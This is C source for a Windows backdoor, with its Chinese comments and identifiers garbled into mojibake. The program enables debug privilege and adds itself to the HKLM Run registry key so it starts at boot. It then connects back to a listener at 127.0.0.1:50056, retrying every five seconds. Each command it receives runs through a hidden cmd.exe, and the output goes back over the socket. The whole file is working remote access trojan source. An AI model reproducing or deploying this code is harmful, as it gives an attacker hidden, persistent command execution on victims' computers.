#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<winsock2.h>
#include<stdlib.h>
#include<conio.h>
#include<Windows.h>
#include<TlHelp32.h>
#pragma warning(disable:4996)//���Ӿ���
#pragma comment(lib, "ws2_32.lib") 

char* a = NULL; //·��

//д��ע���
int ע���д��() {
	HKEY hkey;
	if (ERROR_SUCCESS != RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey)) {//�жϴ�ע����Ƿ�ɹ�(KEY_ALL_ACCESSΪ����Ȩ��)��32λ�ĳ��򲢲��ܳɹ����Ҫ����KEY_WOW64_64KEY
		GetLastError();//�����eax�Ĵ���
		return FALSE;
	}
	//ע�⣡����RegSetValueExA��RegSetValueEx�ַ�����һ������A��ʾΪascii�룬����a��ʾunicode��asciiΪ1���ֽڣ�unicode��ʾ2���ֽڣ���ͬ�ֽڵı�ʾ��·����һ���������׵��³�������������
	if (ERROR_SUCCESS != RegSetValueExA(hkey, "Enabled", 0, REG_SZ, a, strlen(a) + 1)) {
		RegCloseKey(hkey);//�ر�
		GetLastError();//�����eax�Ĵ���
		printf("%s", "set fail");
		return FALSE;
	}
	RegCloseKey(hkey);//�ر�
	//MessageBoxA(0, 0, "���óɹ�", MB_OK);
}

int ������Ȩ() {
	int flag = 0;//�ж��Ƿ���Ȩ�ɹ�
	HANDLE ���̷�������;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &���̷�������)) {//�򿪽��̷�������
		TOKEN_PRIVILEGES ����Ȩ��;//����Ȩ�޽ṹ��
		����Ȩ��.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &����Ȩ��.Privileges[0].Luid);//����Ȩ��
		����Ȩ��.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;//������Ȩ
		if (AdjustTokenPrivileges(���̷�������, FALSE, &����Ȩ��, sizeof(����Ȩ��), NULL, NULL)) {//�ж�Ȩ���Ƿ�Ķ��ɹ�
			flag = 1;
		}
	}
	CloseHandle(���̷�������);//�رս��̷�������
	return flag;
}

void ������() {
	WORD version = MAKEWORD(2, 2);//��汾��
	WSADATA wsdata;//�ṹ��
	//WSAStartup(version, &wsdata);//����ֵΪ0���سɹ���1����ʧ��
	if (WSAStartup(version, &wsdata)) {
		printf("����ʧ��");
		return;
	}
	SOCKET sock;
	//�׽��ֽṹ��
	SOCKADDR_IN info;//ip��ַ��ʽ�� �˿ںţ�ip��ַ
	info.sin_family = AF_INET;//ip��ַ��ʽ
	info.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//ת��IP��ַ����������Զ�������͸�
	//INADDR_ANYΪ�󶨱�����ַ��htonlΪת���ֽ���
	info.sin_port = htons(50056);//ת���˿�Ϊ��˴洢
	sock = socket(AF_INET, SOCK_STREAM, 0);//�����׽���

	char buf[1024 * 5] = { 0 };

	while (WSAConnect(sock, &info, sizeof(info), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {//�ж������Ƿ�ɹ�
		Sleep(5000);
		continue;
	}

	send(sock, "�⼦����", strlen("�⼦����"), 0);
	for (char* cmdline[255];; memset(cmdline, 0, sizeof(cmdline))) {//memset��ճ�0
		SECURITY_ATTRIBUTES sa;
		HANDLE hRead, hWrite;
		//ʹ�������ܵ�
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		//�����ܵ�
		CreatePipe(&hRead, &hWrite, &sa, 0);

		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si);//��ȡ��ǰ������Ϣ
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;//��������
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

		//��ȡCMD·��
		GetSystemDirectoryA(cmdline, 255);//��ȡϵͳ·��
		strncat(cmdline, "\\cmd.exe /c ", strlen("\\cmd.exe / c"));//�ҵ�cmd.exe����·����ִ������
		int len = recv(sock, buf, 1024 * 5, NULL);//��ȡ�ֽ���
		if (len == SOCKET_ERROR) {
			exit(0);
		}
		strncat(cmdline, buf, strlen(buf));//������������Ƶ�cmdline��
		CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);//��������
		CloseHandle(hWrite);
		for (int readBytes; ReadFile(hRead, buf, 1024 * 5, &readBytes, NULL);
			memset(buf, 0, 1024 * 5)) {//��ȡ�ܵ��ֽ���������readBytes�����ÿ�ζ������
			send(sock, buf, strlen(buf), 0);//����buf����
		}
	}
}

void main(int argc, char* argv[]) {
	if (������Ȩ() == 1) {
		a = argv[0];
		ע���д��();
		������();
	}
}